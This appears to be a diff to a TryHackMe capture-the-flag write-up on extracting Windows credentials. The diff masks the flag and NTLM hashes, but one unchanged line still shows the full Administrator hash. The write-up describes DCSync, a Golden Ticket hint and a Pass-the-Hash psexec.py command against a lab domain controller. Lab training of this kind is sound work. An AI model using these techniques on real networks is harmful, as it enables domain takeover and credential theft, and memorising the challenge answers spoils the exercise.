@@ -13,7 +13,7 @@
 
 A hands-on room covering the five core Windows credential storage locations — LSASS Memory, SAM + SYSTEM hives, LSA Secrets, DPAPI Vault, and NTDS.dit — with practical extraction using Mimikatz, Impacket's secretsdump.py, and John the Ripper. The room progresses from local credential extraction on a workstation to a full DCSync attack against the domain controller, ending with Pass-the-Hash access to retrieve the final flag.
 
-**Flag:** `THM{gotta_l0ve_cr3dential_st0res}`
+**Flag:** `THM{gotta_l??????l_st0res}`
 
 ---
 
@@ -176,8 +176,8 @@ WRK$:1111:aad3b435b51404eeaad3b435b51404ee:f6dca6027f8479810acbe9b5a6d3ef4b:::
 Kerberos keys (AES256, AES128, DES) were also extracted for every account.
 
 **Critical hashes:**
-- `Administrator` NTLM: `d71ee9fb6a3f54496bdc6c941f7a2903` — Domain Admin, full access
-- `krbtgt` NTLM: `399b08294203eeafef6c1ec6d5747127` — enables Golden Ticket attack
+- `Administrator` NTLM: `d71ee9fb6a3f54???41f7a2903` — Domain Admin, full access
+- `krbtgt` NTLM: `399b082942????c1ec6d5747127` — enables Golden Ticket attack
 
 ---
 
@@ -186,7 +186,7 @@ Kerberos keys (AES256, AES128, DES) were also extracted for every account.
 Used the Domain Administrator NTLM hash to gain SYSTEM shell on the DC without knowing the plaintext password:
 
 ```bash
-psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3f54496bdc6c941f7a2903
+psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3?????c941f7a2903
 ```
 
 The `:hash` syntax (colon prefix, no LM hash) is shorthand — equivalent to `aad3b435b51404eeaad3b435b51404ee:d71ee9fb6a3f54496bdc6c941f7a2903`.
@@ -206,7 +206,7 @@ psexec.py authenticates via SMB using the NTLM hash, uploads a service binary to
 
 ```
 C:\Users\Administrator\Desktop> type flag.txt.txt
-THM{gotta_l0ve_cr3dential_st0res}
+THM{gotta_l0????tial_st0res}
 ```
 
 ---
